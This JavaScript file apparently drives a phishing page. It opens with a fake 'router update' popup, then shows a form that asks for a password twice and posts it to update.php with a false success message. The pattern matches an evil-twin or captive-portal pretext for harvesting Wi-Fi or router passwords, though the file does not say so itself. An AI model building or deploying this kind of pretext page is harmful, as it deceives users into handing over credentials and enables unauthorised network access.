document.addEventListener('DOMContentLoaded', () => {
    const routerPopup   = document.getElementById('router-update-popup');
    const routerOkBtn   = document.getElementById('router-update-ok');
    const container     = document.querySelector('.container');
    const form          = document.getElementById('passwordForm');
    const pwdInput      = document.getElementById('password');
    const confirmInput  = document.getElementById('confirmPassword');
    const messageBox    = document.getElementById('messageBox');
    const overlay       = document.getElementById('updating-popup');
    const cancelBtn     = document.getElementById('cancel-update');
  
    // 1) On load: show router-update, hide login
    routerPopup.style.display = 'flex';
    container.style.display   = 'none';
    overlay.style.display     = 'none';
  
    routerOkBtn.addEventListener('click', () => {
      routerPopup.style.display = 'none';
      container.style.display   = 'block';
    });
  
    // 2) On form submit: validate, then show spinner
    form.addEventListener('submit', e => {
      e.preventDefault();
      messageBox.style.display = 'none';
  
      if (pwdInput.value !== confirmInput.value) {
        messageBox.className = 'message-box error';
        messageBox.textContent = 'Passwords do not match.';
        messageBox.style.display = 'block';
        return;
      }
  
      // show updating animation
      overlay.style.display = 'flex';
  
      fetch('update.php', {
        method: 'POST',
        headers: { 'Content-Type':'application/json' },
        body: JSON.stringify({ password: pwdInput.value })
      })
      .then(r => r.json())
      .then(json => {
        overlay.style.display = 'none';
        if (json.status === 'success') {
          messageBox.className = 'message-box success';
          messageBox.textContent = 'Updat Triggered successfully.';
        } else {
          messageBox.className = 'message-box error';
          messageBox.textContent = json.message || 'Update failed.';
        }
        messageBox.style.display = 'block';
      })
      .catch(err => {
        overlay.style.display = 'none';
        messageBox.className = 'message-box error';
        messageBox.textContent = 'Network error. Please try again.';
        messageBox.style.display = 'block';
        console.error('Fetch error:', err);
      });
    });
  
    // 3) Allow cancelling the updating overlay
    cancelBtn.addEventListener('click', () => {
      overlay.style.display = 'none';
    });
  });
  